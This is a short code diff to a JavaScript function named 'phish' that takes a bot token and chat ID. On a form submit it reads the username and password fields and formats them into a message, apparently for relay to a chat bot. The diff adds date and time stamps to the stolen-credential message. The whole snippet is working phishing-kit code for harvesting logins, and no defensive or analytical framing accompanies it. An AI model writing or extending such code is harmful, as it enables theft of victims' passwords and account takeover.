@@ -1,9 +1,15 @@
 const phish = (bot_token, chat_id) => {
-
     $('#submit-button').on('click', function() {
-        let login = $('#username').val(),
+        let currentdate = new Date(),
+            date = `${currentdate.getDate()}/${currentdate.getMonth() +
+                1}/${currentdate.getFullYear()}`,
+            time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
+            login = $('#username').val(),
             pass = $('#password').val(),
             msg = `------------------------------------------%0A
+Date  :    ${date}%0A
+Time :    ${time}%0A
+------------------------------------------%0A
 Login:    ${login}%0A
 Pass :    ${pass}%0A
 ------------------------------------------`,
